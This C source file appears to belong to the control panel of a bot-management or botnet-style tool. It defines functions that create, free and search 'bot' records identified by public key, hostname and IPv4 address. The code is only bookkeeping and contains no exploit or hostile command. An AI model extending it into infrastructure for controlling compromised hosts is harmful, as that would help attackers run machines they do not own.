#include "lmem.h"
#include "lerror.h"
#include "pbot.h"

#include "panel.h"

tPanel_bot *panelB_newBot(uint8_t *pubKey, char *hostname, char *ipv4) {
    tPanel_bot *bot = laikaM_malloc(sizeof(tPanel_bot));
    int length;

    /* copy pubKey to bot's pubKey */
    memcpy(bot->pub, pubKey, crypto_kx_PUBLICKEYBYTES);

    /* copy hostname & ipv4 */
    memcpy(bot->hostname, hostname, LAIKA_HOSTNAME_LEN);
    memcpy(bot->ipv4, ipv4, LAIKA_IPV4_LEN);

    /* restore NULL terminators */
    bot->hostname[LAIKA_HOSTNAME_LEN-1] = 0;
    bot->ipv4[LAIKA_IPV4_LEN-1] = 0;

    /* make bot name */
    length = strlen(bot->hostname) + 1 + strlen(bot->ipv4) + 1;
    bot->name = laikaM_malloc(length);
    sprintf(bot->name, "%s@%s", bot->hostname, bot->ipv4);

    return bot;
}

void panelB_freeBot(tPanel_bot *bot) {
    laikaM_free(bot->name);
    laikaM_free(bot);
}

/* search connected bots by public key */
tPanel_bot *panelB_getBot(uint8_t *pubKey) {
    tPanel_listItem *curr = panel_botList->itemHead;
    tPanel_bot *bot; 

    while (curr != NULL) {
        bot = (tPanel_bot*)curr->uData;

        /* check pubKeys */
        if (memcmp(pubKey, bot->pub, crypto_kx_PUBLICKEYBYTES) == 0)
            return bot; /* they match! */

        curr = curr->next;
    }

    /* no match found :( */
    return NULL;
}

void panelB_setItem(tPanel_bot *bot, tPanel_listItem *item) {
    bot->item = item;
}